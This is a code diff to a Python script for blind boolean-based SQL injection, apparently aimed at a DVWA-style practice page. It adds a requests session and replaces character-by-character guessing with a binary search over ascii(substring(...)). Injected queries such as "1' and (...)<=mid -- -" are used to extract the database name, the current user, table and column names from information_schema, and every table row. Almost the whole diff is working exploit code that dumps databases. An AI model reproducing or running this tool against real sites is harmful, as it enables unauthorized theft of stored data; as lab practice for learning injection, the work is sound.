@@ -9,7 +9,8 @@ def main():
 	global url
 	global payload
 	global cookies
-
+	global session
+	session = requests.session()
 	cookies = None
 
 	argv = parse_arguments()
@@ -21,7 +22,7 @@ def main():
 	payload = '&Submit=Submit'
 	
 	print("---> Testing target...")
-	r = requests.get(url, cookies=cookies)
+	r = session.get(url, cookies=cookies)
 	
 	if r is not None:
 		print("--> Target is awake\n")
@@ -85,7 +86,7 @@ def find_active_db() -> str:
 	print(f"--> Active DB's name has {db_len} characters")
 	print("--> Dumping active DB name...")
 
-	return find_query_string("select substring(database(),*,1)", db_len)
+	return find_query_string("select ascii(substring(database(),*,1))", db_len)
 
 
 
@@ -96,7 +97,7 @@ def find_user() -> str:
 	print(f"--> Active user has {user_len} characters")
 	print("--> Printing active user...")
 
-	return find_query_string("select substring(user(),*,1)", user_len)
+	return find_query_string("select ascii(substring(user(),*,1))", user_len)
 
 
 def find_n_db() -> int:
@@ -106,7 +107,7 @@ def find_n_db() -> int:
 def dump_db(db_name) -> None:
 	
 	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
-	tables = find_query_string(f"select substring(group_concat(table_name),*,1) from information_schema.tables where table_schema='{db_name}'", concat_len)
+	tables = find_query_string(f"select ascii(substring(group_concat(table_name),*,1)) from information_schema.tables where table_schema='{db_name}'", concat_len)
 	
 	tables = tables.split(",")
 	for table in tables:
@@ -116,7 +117,7 @@ def dump_db(db_name) -> None:
 def dump_table(db_name, table_name) -> None:
 	concat_len = find_query_length(f"select length(group_concat(column_name)) from information_schema.columns where table_name='{table_name}'")
 	
-	tbl_schema = find_query_string(f"select substring(group_concat(column_name),*,1) from information_schema.columns where table_name='{table_name}'", concat_len)
+	tbl_schema = find_query_string(f"select ascii(substring(group_concat(column_name),*,1)) from information_schema.columns where table_name='{table_name}'", concat_len)
 	table_dump = dump_columns(tbl_schema, db_name, table_name)
 	print(AsciiTable(table_dump).table)
 
@@ -132,59 +133,69 @@ def dump_columns(columns, db_name, table_name) -> list:
 		query_len = find_query_length(f"select length(concat({columns})) from {db_name}.{table_name} limit {i},1")
 		
 		# Recibimos y parseamos
-		record = find_query_string(f"select substring(concat({columns}),*,1) from {db_name}.{table_name} limit {i},1", query_len)
+		record = find_query_string(f"select ascii(substring(concat({columns}),*,1)) from {db_name}.{table_name} limit {i},1", query_len)
 		tbl_schema.append(record.split(":"))
 	return tbl_schema
 
 def find_query_count(query):
 	i = 0
-	r_base = requests.get(url + payload, cookies=cookies)
+	r_base = session.get(url + payload, cookies=cookies)
 	r = r_base
 
 	while r_base.text == r.text:
 		i += 1
-		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
+		r = session.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
 		size = len(r.text)
 		
 	return i
 
 def find_query_length(query):
 	res_text = []
-	i = 1
 
-	r_base = requests.get(url + payload, cookies=cookies)
+	r_base = session.get(url + payload, cookies=cookies)
 	r = r_base
 
-	# Sacar longitud de la query
-	while r.text == r_base.text:
-		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
-		size = len(r.text)
-		i += 1
+	# Sacar longitud de la query con busqueda binary (o(logn))
+	low, high= 1, 150
+	while high - low > 1:
+		r = session.get(f"{url}1' and ({query})<{ (low + high) // 2 } -- -&Submit=Submit#", cookies=cookies)
 
-	return i - 1
+		if r.text != r_base.text:
+			high = (low + high) // 2
+		else:
+			low = (low + high) // 2
+
+	return low
 
 def find_query_string(query, query_len):
-	char = 32
+	low, high = 32, 126
 	i = 1
 	query_res = []
 
 	r_base = requests.get(url + payload, cookies=cookies)
 	r = r_base
 	
-	while i <= query_len:
+	while len(query_res) < query_len:
+		low, high = 32, 126
 		
-		r = requests.get(f"{url}1' and ({query.replace("*", str(i))})='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)
+		while high - low > 1:
+			mid = (low + high) // 2
+			#print(mid)
+			#print(f"{url}1' and ({query.replace("*", str(i))})<={mid} -- -&Submit=Submit#")
+			r = session.get(f"{url}1' and ({query.replace("*", str(i))})<={mid} -- -&Submit=Submit#", cookies=cookies)
 
-		if r.text != r_base.text:
-			query_res.append(chr(char))
-			print(f"\r{''.join(query_res).lower()}", end='')		
-			i += 1
-			char = 32
-		else:
-			char += 1
+			if r.text != r_base.text:
+				high = mid
+			else:
+				low = mid
+
+		query_res.append(chr(low + 1))
+		i += 1
+		print(f"\r{''.join(query_res).lower()}", end='')
 	print("\n")
 
 	return ''.join(query_res).lower()
+
 
 def print_banner():
 	text = r"""
